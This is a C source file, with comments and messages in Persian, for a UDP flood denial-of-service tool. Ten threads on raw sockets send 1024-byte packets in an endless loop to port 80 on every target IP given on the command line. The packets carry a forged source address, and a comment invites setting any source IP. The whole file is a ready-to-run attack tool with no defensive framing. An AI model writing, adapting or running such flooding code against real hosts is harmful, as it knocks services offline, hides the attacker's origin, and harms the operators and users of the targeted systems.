#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <pthread.h>
#include <unistd.h>

#define BUFFER_SIZE 1024
#define THREAD_COUNT 10
#define MAX_IPS 100

// ساخت هدر UDP
struct pseudo_header {
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short udp_length;
};

// محاسبه checksum
unsigned short calculate_checksum(unsigned short *ptr, int nbytes) {
    unsigned long sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        sum += *(unsigned char *)ptr;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

// ارسال بسته‌ها به IP مشخص
void *send_packets(void *arg) {
    char **target_ips = (char **)arg;
    int raw_socket = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);

    if (raw_socket < 0) {
        perror("خطا در ایجاد سوکت");
        pthread_exit(NULL);
    }

    char packet[BUFFER_SIZE];
    memset(packet, 0, BUFFER_SIZE);

    struct iphdr *ip_header = (struct iphdr *)packet;
    struct udphdr *udp_header = (struct udphdr *)(packet + sizeof(struct iphdr));

    ip_header->ihl = 5;
    ip_header->version = 4;
    ip_header->tos = 0;
    ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + BUFFER_SIZE - sizeof(struct iphdr) - sizeof(struct udphdr));
    ip_header->id = htonl(rand() % 65535);
    ip_header->frag_off = 0;
    ip_header->ttl = 64;
    ip_header->protocol = IPPROTO_UDP;
    ip_header->saddr = inet_addr("192.168.1.100"); // تغییر به IP مبدا دلخواه

    udp_header->source = htons(rand() % 65535);
    udp_header->dest = htons(80);
    udp_header->len = htons(sizeof(struct udphdr) + BUFFER_SIZE - sizeof(struct iphdr) - sizeof(struct udphdr));

    while (1) {
        for (int i = 0; target_ips[i] != NULL; i++) {
            struct sockaddr_in target_addr;
            target_addr.sin_family = AF_INET;
            target_addr.sin_port = htons(80);
            inet_pton(AF_INET, target_ips[i], &target_addr.sin_addr);

            udp_header->check = 0;
            ip_header->check = 0;

            ip_header->id = htonl(rand() % 65535);
            ip_header->daddr = target_addr.sin_addr.s_addr;
            ip_header->check = calculate_checksum((unsigned short *)ip_header, sizeof(struct iphdr));

            if (sendto(raw_socket, packet, sizeof(struct iphdr) + sizeof(struct udphdr) + BUFFER_SIZE - sizeof(struct iphdr) - sizeof(struct udphdr), 0, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
                perror("خطا در ارسال بسته");
            }
        }
    }

    close(raw_socket);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("استفاده: %s <آدرس IP مقصد 1> <آدرس IP مقصد 2> ...\n", argv[0]);
        return 1;
    }

    pthread_t threads[THREAD_COUNT];

    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_create(&threads[i], NULL, send_packets, argv + 1);
    }

    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }

    return 0;
}
